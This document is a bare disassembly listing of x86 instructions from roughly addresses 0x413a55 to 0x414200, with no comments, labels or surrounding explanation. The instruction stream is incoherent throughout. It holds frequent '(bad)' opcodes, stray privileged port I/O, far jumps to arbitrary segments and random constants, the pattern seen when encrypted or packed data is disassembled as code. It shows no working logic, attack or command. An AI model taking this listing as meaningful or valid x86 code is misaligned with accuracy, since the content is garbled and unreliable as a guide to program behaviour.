  413a55:	lahf   
  413a56:	jecxz  0x413a2f
  413a58:	sbb    eax,0x1adbb34c
  413a5d:	cdq    
  413a5e:	cmp    ah,bh
  413a60:	loope  0x4139f6
  413a62:	retf   0xc544
  413a65:	dec    esi
  413a66:	mov    edx,0xb45f858b
  413a6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a6c:	ret    0x414f
  413a6f:	aaa    
  413a70:	cmp    DWORD PTR [esi],ebp
  413a72:	stos   DWORD PTR es:[edi],eax
  413a73:	or     eax,0xd11df52e
  413a78:	int3   
  413a79:	xor    al,0xb5
  413a7b:	jne    0x413aa1
  413a7d:	mov    dl,BYTE PTR [ebx+0x7a]
  413a80:	test   al,0x8b
  413a82:	sahf   
  413a83:	mov    db4,esi
  413a86:	outs   dx,DWORD PTR ds:[esi]
  413a87:	push   esp
  413a88:	jmp    0x6ad9:0x953273f0
  413a8f:	jl     0x413ac8
  413a91:	cwde   
  413a92:	jo     0x413a95
  413a94:	dec    eax
  413a95:	outs   dx,BYTE PTR ds:[esi]
  413a96:	pop    ebx
  413a97:	add    edx,ebp
  413a99:	mov    WORD PTR [eax-0x530f944f],gs
  413a9f:	ss retf 0xf583
  413aa3:	das    
  413aa4:	ds cli 
  413aa6:	js     0x413b00
  413aa8:	aam    0x80
  413aaa:	stc    
  413aab:	xor    BYTE PTR [edx],0xcf
  413aae:	imul   ebx,DWORD PTR [ebx-0x35],0xfa67b33c
  413ab5:	into   
  413ab6:	inc    eax
  413ab7:	or     dl,ch
  413ab9:	sub    eax,0xdb35f3a0
  413abe:	xor    bh,bl
  413ac0:	or     BYTE PTR [edx+0x50],dl
  413ac3:	or     dl,cl
  413ac5:	push   eax
  413ac6:	leave  
  413ac7:	in     al,dx
  413ac8:	and    al,0x5d
  413aca:	sub    eax,0x8f290222
  413acf:	push   DWORD PTR [edi+0x706ba8c4]
  413ad5:	(bad)  
  413ad6:	push   ecx
  413ad7:	scas   eax,DWORD PTR es:[edi]
  413ad8:	jmp    0x5eda:0xb92ead6a
  413adf:	jmp    0xd2ad:0xb8fba73c
  413ae6:	jle    0x413ab4
  413ae8:	data16 test al,0xb
  413aeb:	test   BYTE PTR [edi],cl
  413aed:	imul   DWORD PTR [esi+0xd]
  413af0:	add    al,0x38
  413af2:	jmp    0x413b34
  413af4:	mov    al,ds:0x488e2f9d
  413af9:	imul   ebx,edx,0x72234651
  413aff:	popf   
  413b00:	clc    
  413b01:	cli    
  413b02:	ret    
  413b03:	mov    eax,ds:0x7940a450
  413b08:	push   esp
  413b09:	(bad)  
  413b0b:	cdq    
  413b0c:	mov    es,WORD PTR [ebx]
  413b0e:	mov    es,edi
  413b10:	dec    esi
  413b11:	jne    0x413afb
  413b13:	into   
  413b14:	or     eax,0xdd8b6167
  413b19:	loope  0x413adb
  413b1b:	ficom  WORD PTR ds:0xe8393184
  413b21:	mov    ecx,0x375b6db8
  413b26:	fwait
  413b27:	mov    esp,0xef229888
  413b2c:	std    
  413b2d:	sbb    DWORD PTR [ebx+edi*8+0x16],esi
  413b31:	push   edi
  413b32:	scas   eax,DWORD PTR es:[edi]
  413b33:	cmp    eax,DWORD PTR [ebp+0x1b]
  413b36:	and    ah,al
  413b38:	pop    edi
  413b39:	shl    BYTE PTR [ecx],cl
  413b3b:	out    dx,eax
  413b3c:	fs dec ecx
  413b3e:	or     eax,0xc35dd282
  413b43:	mov    ah,0xb0
  413b45:	fwait
  413b46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b47:	shl    ch,1
  413b49:	mov    eax,ds:0xb56b5592
  413b4e:	(bad)  
  413b4f:	dec    edx
  413b50:	call   0x1bbc:0xe4ab0282
  413b57:	rol    ebp,cl
  413b59:	add    eax,0x7885a786
  413b5e:	mov    ebx,DWORD PTR [edi+eax*2-0x5a]
  413b62:	sub    esi,0x5a42d2c2
  413b68:	test   al,0xdd
  413b6a:	mov    dh,0x80
  413b6c:	js     0x413ba1
  413b6e:	push   esp
  413b6f:	fcmovnu st,st(3)
  413b71:	cmp    eax,0x4e4fd34e
  413b76:	push   edi
  413b77:	dec    ebp
  413b78:	arpl   di,bx
  413b7a:	or     DWORD PTR cs:[esi],0xa6a294c0
  413b81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b82:	cmp    DWORD PTR [ecx-0x2e21cd84],ebx
  413b88:	cmp    DWORD PTR [edx],ebx
  413b8a:	daa    
  413b8b:	mov    al,0x40
  413b8d:	mov    ah,0xc
  413b8f:	std    
  413b90:	sub    BYTE PTR [esi-0x662da3e0],dl
  413b96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b97:	inc    esi
  413b98:	push   ebx
  413b99:	pop    edi
  413b9a:	push   ecx
  413b9b:	stos   DWORD PTR es:[edi],eax
  413b9c:	cmp    DWORD PTR ds:0xee54ca21,edi
  413ba2:	call   FWORD PTR [eax+eax*4-0x734c1593]
  413ba9:	xchg   ebx,eax
  413baa:	repz dec bp
  413bad:	mov    bl,0x4e
  413baf:	push   esi
  413bb0:	repz daa 
  413bb2:	not    BYTE PTR [ecx+0x5b4bbc74]
  413bb8:	inc    ebx
  413bb9:	and    ebp,DWORD PTR [ebp-0x34]
  413bbc:	mov    gs,esp
  413bbe:	jmp    0x413b94
  413bc0:	cmp    dh,BYTE PTR [ebp-0x32c58c73]
  413bc6:	sbb    BYTE PTR [edx-0x4d],bh
  413bc9:	in     eax,dx
  413bca:	js     0x413c18
  413bcc:	shr    BYTE PTR [ebx],1
  413bce:	push   es
  413bcf:	push   0xd544fff6
  413bd4:	mov    esi,0xe975f19b
  413bd9:	jno    0x413bfa
  413bdb:	or     dh,BYTE PTR [edx+0x73756274]
  413be1:	les    eax,FWORD PTR [esi]
  413be3:	xchg   edx,eax
  413be4:	cmp    al,0xda
  413be6:	imul   esp,DWORD PTR [ebx-0x11b093d7],0x7bb1dc59
  413bf0:	ds xchg ecx,eax
  413bf2:	or     bh,BYTE PTR [ebx+ebp*1-0x22]
  413bf6:	jno    0x413c59
  413bf8:	xchg   ebp,eax
  413bf9:	adc    esp,edx
  413bfb:	pop    eax
  413bfc:	sbb    DWORD PTR [ecx-0x119eeeda],edi
  413c02:	(bad)  
  413c03:	xchg   esp,eax
  413c04:	test   al,0x5d
  413c06:	or     bh,ch
  413c08:	jbe    0x413bc9
  413c0a:	fs cmp al,0x20
  413c0d:	cmc    
  413c0e:	cmp    ah,dl
  413c10:	jmp    0x413bef
  413c12:	data16 (bad) 
  413c14:	imul   esi,ebx,0xffffffe8
  413c17:	pop    ebx
  413c18:	fbld   TBYTE PTR [edx-0x465cbf76]
  413c1e:	dec    esi
  413c1f:	jbe    0x413bf1
  413c21:	into   
  413c22:	fs xchg esp,eax
  413c24:	xor    eax,0xf4f370a3
  413c29:	sub    al,0xfc
  413c2b:	mov    eax,ecx
  413c2d:	push   edi
  413c2e:	or     al,0xae
  413c30:	xor    dh,BYTE PTR [ecx-0x5a4970d4]
  413c36:	push   ecx
  413c37:	in     eax,0xe9
  413c39:	pop    ebx
  413c3a:	lahf   
  413c3b:	mov    esi,0xce8303ea
  413c40:	rcl    ah,cl
  413c42:	mov    DWORD PTR ds:0x64dc5252,ebx
  413c48:	xchg   ebx,eax
  413c49:	dec    edx
  413c4a:	push   eax
  413c4b:	and    al,BYTE PTR [esp+0x6]
  413c4f:	jmp    0xaf71c960
  413c54:	lods   eax,DWORD PTR ds:[esi]
  413c55:	sub    edi,DWORD PTR [esi-0x7c]
  413c58:	xchg   ebx,eax
  413c59:	shl    DWORD PTR [ebp-0x13],cl
  413c5c:	out    0xc7,eax
  413c5e:	lea    edx,[esi+ebx*8-0x63]
  413c62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c63:	loop   0x413c99
  413c65:	pop    sp
  413c67:	and    dl,BYTE PTR [edi+0xd]
  413c6a:	jg     0x413c26
  413c6c:	xchg   ebp,eax
  413c6d:	stc    
  413c6e:	or     DWORD PTR [eax+eax*1+0x398c99e],eax
  413c75:	add    dh,dl
  413c77:	mov    ds:0xee709652,eax
  413c7c:	jbe    0x413c0e
  413c7e:	cli    
  413c7f:	lods   al,BYTE PTR ds:[esi]
  413c80:	push   edx
  413c81:	out    0x11,al
  413c83:	pop    ds
  413c84:	fcmovbe st,st(1)
  413c86:	xor    esi,ebx
  413c88:	or     BYTE PTR [esp+eax*1-0x53],bl
  413c8c:	xchg   BYTE PTR [esi+0x52ef63c5],al
  413c92:	pop    es
  413c93:	sub    al,0x56
  413c95:	stos   DWORD PTR es:[edi],eax
  413c96:	mov    esi,0x36cc5084
  413c9b:	jae    0x413d0a
  413c9d:	mov    al,ds:0xe105182f
  413ca2:	add    esi,DWORD PTR [eax+0x59ce7b]
  413ca8:	fbld   TBYTE PTR [eax]
  413caa:	fimul  WORD PTR [ecx+0x27dfb0c5]
  413cb0:	cmp    BYTE PTR [ebx+0x49],dl
  413cb3:	xchg   esi,eax
  413cb4:	gs in  eax,dx
  413cb6:	sbb    ecx,DWORD PTR ss:[ebx-0x2f]
  413cba:	jecxz  0x413c4b
  413cbc:	xchg   ebx,eax
  413cbd:	and    BYTE PTR [esi-0x78],0x41
  413cc1:	lea    ecx,[edx-0x2f]
  413cc4:	xor    BYTE PTR [esi-0x63],dh
  413cc7:	push   ss
  413cc8:	add    cl,dl
  413cca:	mov    bh,0xe1
  413ccc:	rcl    ch,0xab
  413ccf:	fstp   TBYTE PTR [edx]
  413cd1:	xchg   edx,eax
  413cd2:	mov    bh,0xb2
  413cd4:	jl     0x413cdf
  413cd6:	sbb    ch,ch
  413cd8:	mov    cl,0xc
  413cda:	jbe    0x413d29
  413cdc:	and    BYTE PTR [eax],bl
  413cde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cdf:	cli    
  413ce0:	mov    ah,BYTE PTR [edx]
  413ce2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ce3:	test   eax,0xc8acad13
  413ce8:	push   ebp
  413ce9:	mov    dh,0x8c
  413ceb:	push   ds
  413cec:	pusha  
  413ced:	push   cs
  413cee:	mov    ecx,0x4dbd9389
  413cf3:	stos   DWORD PTR es:[edi],eax
  413cf4:	push   cs
  413cf5:	ror    BYTE PTR [edi-0x24],1
  413cf8:	lds    ebp,FWORD PTR [ebx]
  413cfa:	(bad)  
  413cfb:	mov    dh,0xde
  413cfd:	into   
  413cfe:	adc    esi,DWORD PTR [esi-0x2f99a0ba]
  413d04:	mul    DWORD PTR ds:0xea42b8dd
  413d0a:	in     al,dx
  413d0b:	adc    al,0xe7
  413d0d:	adc    dh,0x44
  413d10:	in     eax,0x51
  413d12:	mov    bl,BYTE PTR ds:0xa9badbc6
  413d18:	inc    esp
  413d19:	aas    
  413d1a:	and    al,0x37
  413d1c:	jmp    0x413d62
  413d1e:	aad    0x9c
  413d20:	pxor   mm3,mm0
  413d23:	mov    esi,0xbd0dcbd9
  413d28:	test   dh,0xaa
  413d2b:	mov    al,0xa4
  413d2d:	add    al,0xbb
  413d2f:	lock std 
  413d31:	adc    DWORD PTR [edi+eiz*2+0x159fa4d],ecx
  413d38:	cmp    eax,0x17d2a93c
  413d3d:	inc    edi
  413d3e:	mov    WORD PTR [eax-0x7],fs
  413d41:	fnstsw WORD PTR [edi-0x2a]
  413d44:	out    dx,eax
  413d45:	xor    ecx,DWORD PTR [ecx]
  413d47:	sti    
  413d48:	xchg   cl,al
  413d4a:	popa   
  413d4b:	test   ecx,0xc9be9354
  413d51:	cmp    edi,ebp
  413d53:	or     ebx,DWORD PTR [esi]
  413d55:	dec    DWORD PTR [esi+0x35]
  413d58:	cli    
  413d59:	int3   
  413d5a:	push   eax
  413d5b:	add    bh,BYTE PTR [ecx+0x5b]
  413d5e:	aas    
  413d5f:	int3   
  413d60:	pop    edx
  413d61:	enter  0xbf0f,0xa4
  413d65:	mov    ch,0x1d
  413d67:	int3   
  413d68:	rcr    BYTE PTR [ebp-0x33],0x4a
  413d6c:	dec    ecx
  413d6d:	out    0xbd,al
  413d6f:	int3   
  413d70:	pop    esi
  413d71:	xor    al,0x11
  413d73:	dec    eax
  413d74:	xchg   ecx,esp
  413d76:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  413d78:	mov    eax,ds:0x2b635c71
  413d7d:	leave  
  413d7e:	mov    esi,0x150b05ee
  413d83:	mov    bh,0xe8
  413d85:	adc    BYTE PTR [edx-0x31],ch
  413d88:	xchg   BYTE PTR [edx+ecx*4+0x779f011a],bl
  413d8f:	xchg   esi,eax
  413d90:	imul   ebp,DWORD PTR [ecx+0x4acda167],0x64ebedab
  413d9a:	mov    ah,0x69
  413d9c:	cmp    eax,0xf575b91c
  413da1:	je     0x413dab
  413da3:	(bad)  
  413da4:	jbe    0x413d89
  413da6:	stc    
  413da7:	sbb    ch,bl
  413da9:	outs   dx,BYTE PTR ds:[esi]
  413daa:	or     BYTE PTR [edx],0x4e
  413dad:	jno    0x413dd2
  413daf:	aad    0x1d
  413db1:	addr16 inc esp
  413db3:	jne    0x413d6a
  413db5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413db6:	imul   ebp,DWORD PTR [eax+0x6f],0xe
  413dba:	xchg   BYTE PTR [eax+edi*2-0x6af34c1d],dh
  413dc1:	xchg   ebp,eax
  413dc2:	or     dh,BYTE PTR [edx+0x2aea0e72]
  413dc8:	retf   
  413dc9:	pop    eax
  413dca:	xlat   BYTE PTR ds:[ebx]
  413dcb:	lock inc ebp
  413dcd:	stc    
  413dce:	cmp    BYTE PTR [ecx+0x28d9de4b],bl
  413dd4:	cs sti 
  413dd6:	push   esp
  413dd7:	mov    eax,0xd72f37f3
  413ddc:	aaa    
  413ddd:	jne    0x413e16
  413ddf:	aas    
  413de0:	xor    eax,0x179f5f00
  413de5:	bnd jmp 0x413dba
  413de8:	pop    ss
  413de9:	jge    0x413dac
  413deb:	sbb    ecx,DWORD PTR [ecx-0x12]
  413dee:	shl    BYTE PTR [edi+ecx*8],1
  413df1:	sbb    al,0xff
  413df3:	dec    ecx
  413df4:	sti    
  413df5:	xchg   edi,eax
  413df6:	push   ebx
  413df7:	lods   eax,DWORD PTR ds:[esi]
  413df8:	mov    edi,edi
  413dfa:	out    dx,eax
  413dfb:	sub    edi,edx
  413dfd:	mov    cl,0x63
  413dff:	test   DWORD PTR [esi-0x10e56c43],esi
  413e05:	retf   
  413e06:	(bad)  
  413e07:	sub    al,0x65
  413e09:	sbb    edx,DWORD PTR [edx]
  413e0b:	or     ecx,0xffffff82
  413e0e:	or     al,0x85
  413e10:	mov    DWORD PTR [ecx],ecx
  413e12:	mov    ds:0xe46338d8,eax
  413e17:	gs xor al,cl
  413e1a:	aaa    
  413e1b:	cdq    
  413e1c:	add    ah,BYTE PTR [ebx+0x1c]
  413e1f:	push   cs
  413e20:	ret    
  413e21:	mov    al,ds:0x30b8e50a
  413e26:	lods   al,BYTE PTR ds:[esi]
  413e27:	xchg   ebx,edx
  413e29:	jmp    0x413e26
  413e2b:	mov    eax,ds:0x3f168a56
  413e30:	popa   
  413e31:	mov    esp,0xe2d375f1
  413e36:	into   
  413e37:	or     BYTE PTR [edx+ecx*2+0x10518345],0x11
  413e3f:	fwait
  413e40:	icebp  
  413e41:	push   cs
  413e42:	push   ss
  413e43:	rcl    dl,cl
  413e45:	in     eax,dx
  413e46:	push   ebx
  413e47:	fxch   st(0)
  413e49:	sbb    bh,al
  413e4b:	push   es
  413e4c:	xchg   ebx,eax
  413e4d:	pop    eax
  413e4e:	data16 rcr ch,cl
  413e51:	mov    ah,BYTE PTR [edi+edi*8-0x1e1383b4]
  413e58:	fxch   st(6)
  413e5a:	xchg   ecx,eax
  413e5b:	dec    ebx
  413e5c:	adc    ecx,ebp
  413e5e:	adc    dh,ah
  413e60:	nop
  413e61:	ret    0x7aa
  413e64:	les    ebp,FWORD PTR [esi-0x7e656a56]
  413e6a:	dec    ecx
  413e6b:	mov    al,ds:0xa0cf126d
  413e70:	inc    esp
  413e71:	and    al,0x24
  413e73:	mov    esp,DWORD PTR [edx+0x5e]
  413e76:	sar    DWORD PTR [ecx-0x7e],cl
  413e79:	out    dx,eax
  413e7a:	add    DWORD PTR [eax+0x6897e6db],0xfffffffb
  413e81:	pop    es
  413e82:	ret    
  413e83:	dec    edx
  413e84:	mov    WORD PTR [esi],ss
  413e86:	ss push 0xcd22f533
  413e8c:	fild   DWORD PTR [ebx+0xa2516b7]
  413e92:	outs   dx,DWORD PTR ds:[esi]
  413e93:	xchg   edx,eax
  413e94:	or     BYTE PTR [ebx],cl
  413e96:	outs   dx,DWORD PTR ds:[esi]
  413e98:	xchg   ebp,eax
  413e99:	adc    esi,DWORD PTR [ecx-0x1f80ac31]
  413e9f:	retf   
  413ea0:	je     0x413e80
  413ea2:	adc    eax,0xc0b4d8
  413ea7:	and    BYTE PTR [ecx],ah
  413ea9:	aam    0x7e
  413eab:	add    eax,0x672b9cdc
  413eb0:	fwait
  413eb1:	adc    BYTE PTR [ecx+0x4d12c306],cl
  413eb7:	jle    0x413e44
  413eb9:	push   edx
  413eba:	call   0xbcac:0x586ee1cd
  413ec1:	pop    es
  413ec2:	adc    al,0x2
  413ec4:	pop    ebx
  413ec5:	jmp    0xf494d0d1
  413eca:	and    dl,0x90
  413ecd:	mov    bh,0x51
  413ecf:	xchg   ecx,eax
  413ed0:	pop    esp
  413ed1:	adc    eax,ebx
  413ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ed4:	jae    0x413e82
  413ed6:	pop    ecx
  413ed7:	test   al,0x4a
  413ed9:	imul   ebx,esi,0xffffffd5
  413edc:	jns    0x413e9c
  413ede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413edf:	push   esi
  413ee0:	aad    0xba
  413ee2:	add    al,0x29
  413ee4:	lods   eax,DWORD PTR ds:[esi]
  413ee5:	or     ebp,ebx
  413ee7:	sti    
  413ee8:	sti    
  413ee9:	xor    DWORD PTR [ecx-0xb],0x42
  413eed:	adc    ebx,DWORD PTR [edi]
  413eef:	lods   al,BYTE PTR ds:[esi]
  413ef0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ef1:	xlat   BYTE PTR ds:[ebx]
  413ef2:	dec    eax
  413ef3:	call   0x4f7f:0xe3b62777
  413efa:	push   ss
  413efb:	sbb    bl,dh
  413efd:	push   ecx
  413efe:	mov    ebx,DWORD PTR [edi+0x62f4f152]
  413f04:	ud2    
  413f06:	dec    ebx
  413f07:	das    
  413f08:	ret    0xcde8
  413f0b:	push   0x68725526
  413f10:	int3   
  413f11:	pop    ebx
  413f12:	sub    al,0xcd
  413f14:	or     bh,BYTE PTR [ecx+0xb87c193]
  413f1a:	or     DWORD PTR [ecx+0x2f86ea63],0x57
  413f21:	jb     0x413f8c
  413f23:	dec    ecx
  413f24:	ins    DWORD PTR es:[edi],dx
  413f25:	das    
  413f26:	out    dx,eax
  413f27:	sahf   
  413f28:	hlt    
  413f29:	mov    ch,0x90
  413f2b:	iret   
  413f2c:	sbb    DWORD PTR [eax],eax
  413f2e:	pop    ss
  413f2f:	repz xor eax,0x1e0ec34b
  413f35:	call   0xe7582850
  413f3a:	dec    esp
  413f3b:	fadd   QWORD PTR [edi]
  413f3d:	xor    BYTE PTR [ebx+0x603c02f1],ch
  413f43:	mov    eax,0x5da0b80a
  413f48:	out    0x54,eax
  413f4a:	sbb    bl,BYTE PTR [ecx+eax*4+0x4c]
  413f4e:	jecxz  0x413fc3
  413f50:	(bad)  
  413f51:	in     al,0xdb
  413f53:	push   ebx
  413f54:	xor    DWORD PTR [ecx],esp
  413f56:	mov    al,ds:0x54c1f5dd
  413f5b:	adc    ah,dl
  413f5d:	push   cs
  413f5e:	shl    BYTE PTR [esi],cl
  413f60:	sbb    al,0x69
  413f62:	xor    DWORD PTR [eax],edi
  413f64:	inc    ebx
  413f65:	rcr    BYTE PTR [ecx+0x2cf790cf],0x83
  413f6c:	jb     0x413f53
  413f6e:	mov    esp,0x4ff3802b
  413f73:	lods   eax,DWORD PTR ds:[esi]
  413f74:	fwait
  413f75:	xchg   edx,eax
  413f76:	mov    cl,0xf0
  413f78:	jbe    0x413f2d
  413f7a:	mov    al,0xa9
  413f7c:	int    0xdc
  413f7e:	mov    dl,0x53
  413f80:	or     eax,0xcb34ed42
  413f85:	leave  
  413f86:	xor    BYTE PTR [edi-0x5f1c6082],0x87
  413f8d:	fdiv   DWORD PTR [ebx+0x331d177a]
  413f93:	ins    BYTE PTR es:[edi],dx
  413f94:	add    BYTE PTR [eax],0x5c
  413f97:	int    0x95
  413f99:	sbb    DWORD PTR [esi+0x49],0xdffdfb6d
  413fa0:	lods   al,BYTE PTR ds:[esi]
  413fa1:	cdq    
  413fa2:	in     al,0xda
  413fa4:	aas    
  413fa5:	rcl    BYTE PTR [edi+0x42],0xbd
  413fa9:	neg    BYTE PTR [ecx]
  413fab:	sbb    dh,ah
  413fad:	xchg   BYTE PTR [edi+edx*8-0x68],al
  413fb1:	mov    eax,ds:0x47b0c740
  413fb6:	cmc    
  413fb7:	cli    
  413fb8:	pop    ss
  413fb9:	call   0x50db:0xf33372a1
  413fc0:	push   eax
  413fc1:	bound  eax,QWORD PTR [ebp-0x538b3f6b]
  413fc7:	jns    0x41400d
  413fc9:	adc    esi,0xe4b57d5b
  413fcf:	aam    0x8f
  413fd1:	mov    ch,0xff
  413fd3:	lods   al,BYTE PTR ds:[esi]
  413fd4:	xor    eax,0x23b41358
  413fd9:	outs   dx,DWORD PTR ds:[esi]
  413fda:	cmc    
  413fdb:	dec    esp
  413fdc:	gs cmp eax,0x30b254ea
  413fe2:	mov    edx,0x42fa2cda
  413fe7:	leave  
  413fe8:	or     ecx,DWORD PTR [edi]
  413fea:	loop   0x413fe4
  413fec:	test   eax,0x3614f7bc
  413ff1:	enter  0x49c5,0xbd
  413ff5:	(bad)  
  413ff6:	sti    
  413ff7:	outs   dx,BYTE PTR ds:[esi]
  413ff8:	pop    edx
  413ff9:	mov    edx,0x9a32c54e
  413ffe:	pop    esi
  413fff:	cli    
  414000:	jle    0x414068
  414002:	sti    
  414003:	rcl    BYTE PTR es:[esi-0x5aa23bc8],1
  41400a:	pop    ecx
  41400b:	push   ebx
  41400c:	adc    BYTE PTR [edi-0x19],al
  41400f:	jnp    0x41401d
  414011:	sub    eax,0x96a663ae
  414016:	rcr    DWORD PTR ds:0xafda79ae,cl
  41401c:	pop    ebp
  41401d:	sti    
  41401e:	aaa    
  41401f:	or     bl,BYTE PTR [eax+0x71]
  414022:	jg     0x413ff0
  414024:	jl     0x414005
  414026:	pop    edi
  414027:	jmp    0x413fc9
  414029:	(bad)  
  41402a:	sbb    edx,DWORD PTR [eax]
  41402c:	inc    esi
  41402d:	add    al,0x5
  41402f:	push   edi
  414030:	lea    esp,[eax-0x1f]
  414033:	inc    esi
  414034:	mov    DWORD PTR [ecx-0x763346b4],esp
  41403a:	sbb    DWORD PTR [ecx+edx*8],edi
  41403d:	(bad)  
  41403e:	ins    DWORD PTR es:[edi],dx
  41403f:	lock add al,0xb7
  414042:	je     0x413ff1
  414044:	xlat   BYTE PTR ds:[ebx]
  414045:	xchg   esp,eax
  414046:	(bad)  
  414047:	sub    bl,BYTE PTR [bp+di-0xabd]
  41404c:	std    
  41404d:	mov    eax,0xc9b0aaef
  414052:	mov    ah,0xa2
  414054:	add    DWORD PTR [eax-0x2d],0xfffffff2
  414058:	repnz pop es
  41405a:	out    dx,eax
  41405b:	mov    esp,0x411e5e29
  414060:	outs   dx,DWORD PTR ds:[esi]
  414061:	and    eax,0x90d622ea
  414066:	fst    st(7)
  414068:	sub    al,0xf9
  41406a:	in     eax,0x83
  41406c:	je     0x41407b
  41406e:	pop    edx
  41406f:	mov    bh,0xd5
  414071:	xor    ch,ch
  414073:	adc    ecx,DWORD PTR [ecx]
  414075:	jne    0x41406b
  414077:	div    BYTE PTR [ebp-0x2d]
  41407a:	inc    esi
  41407b:	cmp    BYTE PTR [eax-0x65],0xf3
  41407f:	ret    0x6acf
  414082:	jl     0x414057
  414084:	mov    DWORD PTR [ebp-0x50],0xc625cc20
  41408b:	das    
  41408c:	stos   DWORD PTR es:[edi],eax
  41408d:	jp     0x4140bb
  41408f:	dec    eax
  414090:	mov    ebp,0xda1c599b
  414095:	push   0xeecff71
  41409a:	push   ecx
  41409b:	dec    edi
  41409c:	fimul  WORD PTR [edi+0x6b]
  41409f:	mov    ecx,0x43023b5
  4140a4:	(bad)  
  4140a5:	ins    BYTE PTR es:[edi],dx
  4140a6:	xchg   esi,eax
  4140a7:	inc    edx
  4140a8:	les    esi,FWORD PTR [ecx+eax*1+0x5a8f0b74]
  4140af:	dec    ebp
  4140b0:	je     0x4140a7
  4140b2:	jecxz  0x41412b
  4140b4:	je     0x41403c
  4140b6:	jmp    0xe576e73e
  4140bb:	and    ah,bh
  4140bd:	pop    esi
  4140be:	js     0x4140fa
  4140c0:	mov    bh,0xf2
  4140c2:	adc    eax,0xb550afa3
  4140c7:	mov    DWORD PTR [ebx-0x5bc32ebe],ecx
  4140cd:	pop    esi
  4140ce:	jmp    0x1e30ffeb
  4140d3:	mov    ah,BYTE PTR [edx-0x7f793eab]
  4140d9:	mov    al,0x2
  4140db:	sar    BYTE PTR [ebx-0x5c],cl
  4140de:	inc    ecx
  4140df:	cmp    esp,DWORD PTR [ecx+0x4445609b]
  4140e5:	jecxz  0x4140a6
  4140e7:	inc    ebp
  4140e8:	add    ecx,DWORD PTR [edx+0x4c]
  4140eb:	inc    ecx
  4140ec:	js     0x414157
  4140ee:	scas   eax,DWORD PTR es:[edi]
  4140ef:	cwde   
  4140f0:	jo     0x41410b
  4140f2:	in     eax,dx
  4140f3:	mov    dh,BYTE PTR [ebp+0x2e8bcbb7]
  4140f9:	sbb    al,0x28
  4140fb:	add    dh,0x81
  4140fe:	popa   
  4140ff:	(bad)  
  414100:	not    BYTE PTR [eax+ecx*8]
  414103:	or     al,0xa2
  414105:	sbb    DWORD PTR [ebp+0x4a73ec19],eax
  41410b:	pop    edx
  41410c:	or     ebx,eax
  41410e:	hlt    
  41410f:	jmp    esp
  414111:	or     eax,0x31bea0f0
  414116:	jno    0x4140c2
  414118:	enter  0x399a,0x95
  41411c:	lods   al,BYTE PTR ds:[esi]
  41411d:	push   eax
  41411e:	int    0xd2
  414120:	iret   
  414121:	ja     0x4140d8
  414123:	adc    eax,0x2cf6faca
  414128:	(bad)  
  414129:	mov    ds:0x9f9ff64f,eax
  41412e:	or     ah,BYTE PTR [edi-0x47f64071]
  414134:	xor    BYTE PTR [eax-0x9cfee4],0xf7
  41413b:	outs   dx,BYTE PTR ds:[esi]
  41413c:	push   eax
  41413d:	jne    0x41414a
  41413f:	sbb    DWORD PTR [eax-0x6e2809ef],0x1b
  414146:	add    ecx,ecx
  414148:	(bad)  
  414149:	pop    esi
  41414a:	or     DWORD PTR [ebp+0x5a],edx
  41414d:	cld    
  41414e:	cmp    BYTE PTR [esi-0x1b],dh
  414151:	sub    esi,0xffffffce
  414154:	dec    edx
  414155:	mov    ecx,edx
  414157:	outs   dx,BYTE PTR ds:[esi]
  414158:	pop    esi
  414159:	xchg   DWORD PTR [ecx+0x31],ebp
  41415c:	pop    ebp
  41415d:	lahf   
  41415e:	jns    0x414148
  414160:	cli    
  414161:	das    
  414162:	mov    bl,bh
  414164:	pop    eax
  414165:	mov    eax,0x92e55543
  41416a:	imul   edi,DWORD PTR [ebp+0x6312f3ca],0xda350beb
  414174:	std    
  414175:	gs sub al,0x8b
  414178:	pop    es
  414179:	sub    DWORD PTR [esi],ebx
  41417b:	out    dx,al
  41417c:	mov    ebx,0x28e2f3db
  414181:	push   ss
  414182:	mov    edx,0xf99bb840
  414187:	xchg   esp,eax
  414188:	jmp    0x4141e8
  41418a:	fbstp  TBYTE PTR [edi+0x33]
  41418d:	(bad)  
  41418e:	stos   DWORD PTR es:[edi],eax
  41418f:	pop    ds
  414190:	ins    BYTE PTR es:[edi],dx
  414191:	or     al,0xe4
  414193:	mov    edx,0xdc1358e6
  414198:	pop    eax
  414199:	fsub   DWORD PTR [edi+0x438e1dce]
  41419f:	jp     0x41417a
  4141a1:	xor    eax,0x35648aca
  4141a6:	ds test esp,esp
  4141a9:	mov    bh,0xb4
  4141ab:	xlat   BYTE PTR ds:[ebx]
  4141ac:	xchg   BYTE PTR [edx],al
  4141ae:	mov    esp,0xdad6b575
  4141b3:	aad    0xe9
  4141b5:	aas    
  4141b6:	jne    0x414166
  4141b8:	push   ebx
  4141b9:	fcomp  DWORD PTR [edx+eax*2]
  4141bc:	ins    BYTE PTR es:[edi],dx
  4141bd:	adc    esp,ecx
  4141bf:	and    dh,al
  4141c1:	push   ebx
  4141c2:	sbb    BYTE PTR [edi+0x17fefb1d],cl
  4141c8:	pusha  
  4141c9:	inc    ebp
  4141ca:	jae    0x41414c
  4141cc:	jno    0x4141e9
  4141ce:	jnp    0x4141e0
  4141d0:	add    al,0x61
  4141d2:	repz fisubr WORD PTR [ebx+0x1aed9459]
  4141d9:	push   eax
  4141da:	cs mov ebp,0xabc37c9c
  4141e0:	sub    ch,0xff
  4141e3:	in     eax,0xc7
  4141e5:	imul   esp,DWORD PTR [ebx],0x145de3d2
  4141eb:	ss cmc 
  4141ed:	dec    ecx
  4141ee:	inc    esp
  4141ef:	xchg   esp,eax
  4141f0:	jo     0x414243
  4141f2:	cmp    edx,ebp
  4141f4:	push   edi
  4141f5:	fwait
  4141f6:	xchg   ecx,eax
  4141f7:	lahf   
  4141f8:	cdq    
  4141f9:	fdiv   QWORD PTR [ecx+0x62]
  4141fc:	push   edi
  4141fd:	sub    eax,DWORD PTR [edx+0x3a]
  414200:	inc    esi
